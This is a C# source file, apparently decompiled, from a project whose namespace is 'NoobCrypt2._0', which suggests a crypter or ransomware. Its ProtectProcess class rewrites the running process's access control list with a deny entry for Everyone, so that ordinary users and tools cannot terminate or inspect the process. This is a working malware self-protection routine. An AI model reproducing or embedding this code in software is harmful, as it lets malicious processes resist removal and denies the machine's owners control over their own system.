using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;

namespace NoobCrypt2._0;

internal class ProtectProcess
{
	[Flags]
	public enum ProcessAccessRights
	{
		PROCESS_CREATE_PROCESS = 0x80,
		PROCESS_CREATE_THREAD = 2,
		PROCESS_DUP_HANDLE = 0x40,
		PROCESS_QUERY_INFORMATION = 0x400,
		PROCESS_QUERY_LIMITED_INFORMATION = 0x1000,
		PROCESS_SET_INFORMATION = 0x200,
		PROCESS_SET_QUOTA = 0x100,
		PROCESS_SUSPEND_RESUME = 0x800,
		PROCESS_TERMINATE = 1,
		PROCESS_VM_OPERATION = 8,
		PROCESS_VM_READ = 0x10,
		PROCESS_VM_WRITE = 0x20,
		DELETE = 0x10000,
		READ_CONTROL = 0x20000,
		SYNCHRONIZE = 0x100,
		WRITE_DAC = 0x40000,
		ITE_OWNER = 0x80000,
		STANDARD_RIGHTS_REQUIRED = 0xF0000,
		PROCESS_ALL_ACCESS = 0xF0FFF
	}

	[DebuggerNonUserCode]
	public ProtectProcess()
	{
	}

	[DllImport("Kernel32.dll")]
	internal static extern IntPtr GetCurrentProcess();

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool SetKernelObjectSecurity(IntPtr Handle, int securityInformation, [In] byte[] pSecurityDescriptor);

	[DllImport("advapi32.dll", SetLastError = true)]
	private static extern bool GetKernelObjectSecurity(IntPtr Handle, int securityInformation, [Out] byte[] pSecurityDescriptor, uint nLength, ref uint lpnLengthNeeded);

	public static void cProtect()
	{
		IntPtr currentProcess = GetCurrentProcess();
		RawSecurityDescriptor rawSecurityDescriptor = ParseProcDescriptor(currentProcess);
		rawSecurityDescriptor.DiscretionaryAcl!.InsertAce(0, new CommonAce(AceFlags.None, AceQualifier.AccessDenied, 987135, new SecurityIdentifier(WellKnownSidType.WorldSid, null), isCallback: false, null));
		EditProcDescriptor(currentProcess, rawSecurityDescriptor);
	}

	public static RawSecurityDescriptor ParseProcDescriptor(IntPtr processHandle)
	{
		byte[] app = new byte[0];
		uint lpnLengthNeeded = 0u;
		GetKernelObjectSecurity(processHandle, 4, app, 0u, ref lpnLengthNeeded);
		if (((long)lpnLengthNeeded < 0L || (long)lpnLengthNeeded > 32767L) ? true : false)
		{
			throw new Win32Exception();
		}
		checked
		{
			if (!GetKernelObjectSecurity(processHandle, 4, InlineAssignHelper(ref app, new byte[(int)(unchecked((long)lpnLengthNeeded) - 1L) + 1]), lpnLengthNeeded, ref lpnLengthNeeded))
			{
				throw new Win32Exception();
			}
			return new RawSecurityDescriptor(app, 0);
		}
	}

	public static void EditProcDescriptor(IntPtr processHandle, RawSecurityDescriptor dal)
	{
		byte[] array = new byte[checked(dal.BinaryLength - 1 + 1)];
		dal.GetBinaryForm(array, 0);
		if (!SetKernelObjectSecurity(processHandle, 4, array))
		{
			throw new Win32Exception();
		}
	}

	private static T InlineAssignHelper<T>(ref T app, T ret)
	{
		app = ret;
		return ret;
	}
}
